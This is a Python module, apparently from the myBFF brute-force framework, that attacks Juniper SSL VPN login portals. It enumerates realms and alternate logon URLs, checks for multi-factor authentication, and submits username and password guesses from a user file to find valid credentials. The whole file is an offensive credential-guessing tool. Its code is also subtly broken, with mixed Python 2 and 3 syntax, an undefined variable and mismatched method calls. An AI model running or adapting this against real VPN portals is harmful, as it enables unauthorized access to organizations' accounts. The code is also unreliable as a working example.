#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class JuniperBrute():
    ignore = ['tz_offset','btnSubmit']
    def urlCheck(self, config, c):
        print("[!] Checking for other logon pages...")
        for n in range(1, 100):
            URL = 'url_' + str(n)
            print("[!]  Trying " + config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL)
            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=True)
            print u
            if u.status_code == 200:
                print "URL Found..." + config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL
                self.MFACheck(c, config, URL)
                if self.MFACheck:
                    self.urlCheck(config, c)
                else:
                    break
            else:
                print("Moving on...")
    def MFACheck(self, c, config, URL):
        print("[!] Checking to see if MultiFactor Authentication is required...")
        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=True)
        m = re.findall('<input (.*?)>', mfa.text, re.DOTALL)
        n = re.findall('password.[0-9]', str(m))
        if n:
            print("[-]  MultiFactor Authentication Required! Checking to see if any other URLs require MFA...")
            return True
        else:
            print("[+]  MultiFactor Authentication is not on. Continuing...")
            return False
    def connectTest(self, config, payload):
        with session() as c:
            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=True)
            m = re.search('p=user-confirm', str(cpost.headers))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=True)
            if cget.cookies:
                URL = cget.cookies['DSSIGNIN']
            else:
                URL = "url_default"
            m = re.findall("<select id=(.*?)select>", cget.text, re.DOTALL)
            n = re.findall("<option(.*?)>(.*?)</option>", str(m), re.DOTALL)
            if n:
                print("[!] The following realms are available:  ")
                for o in n:
                    print("[+]             " + o[1])
                    realm = o[1]
            else:
                print("[+]  No realms available...")
                realm = ""
            MFAused = self.MFACheck(c, config)
            #Check for existence of a second factor MFACheck()
            #if MFACheck() returns TRUE, run urlCheck()
            if MFAused:
                self.urlCheck(config, c, URL)
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'tz_offset': '-360',
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"],
                    'realm': realm,
                    'btnSubmit': 'Sign+In'
                    }
                #self.connectTest(config, payload)
        else:
            payload = {
                'tz_offset': '-360',
                'username': config["USERNAME"],
                'password': config["PASSWORD"],
                'realm': realm,
                'btnSubmit': 'Sign+In'
            }
            self.connectTest(config, payload)
